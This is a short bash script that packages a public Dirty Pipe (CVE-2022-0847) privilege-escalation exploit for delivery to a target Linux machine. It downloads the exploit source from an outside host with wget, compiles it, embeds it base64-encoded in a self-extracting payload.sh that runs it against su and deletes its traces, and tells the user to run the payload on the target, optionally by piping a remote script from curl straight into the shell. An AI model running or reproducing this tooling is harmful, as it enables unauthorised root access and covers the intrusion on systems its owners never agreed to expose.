#!/usr/bin/env bash

#- Public exploit for CVE-2022-0847 -------------------------------------
[ -r dirtypipez.c ] || wget -q https://haxx.in/files/dirtypipez.c

#- Static build ---------------------------------------------------------
gcc dirtypipez.c -o exploit -static -static-libgcc -static-libstdc++

#- in a tarball ---------------------------------------------------------
tar cfz exploit.tgz exploit

#- Header ---------------------------------------------------------------
cat <<'EOF' > payload.sh
cat <<"PAYLOAD" | base64 -d | tar -zpx -C /tmp
EOF

#- embed tarball --------------------------------------------------------
base64 exploit.tgz >> payload.sh

#- Footer ---------------------------------------------------------------
cat <<'EOF' >> payload.sh
PAYLOAD

# run exploit
[ -x /usr/bin/su ] && /tmp/exploit /usr/bin/su || /tmp/exploit /bin/su

# clean-up
echo "rm /tmp/exploit /tmp/sh" | /tmp/sh
EOF

#- Clean-up -------------------------------------------------------------

rm ./exploit{,.tgz}


#- Then on target -------------------------------------------------------
cat <<'EOF'

On target run:
source payload.sh

Or if remotely available on https://webserver:
source <(curl -s https://webserver/payload.sh)

EOF
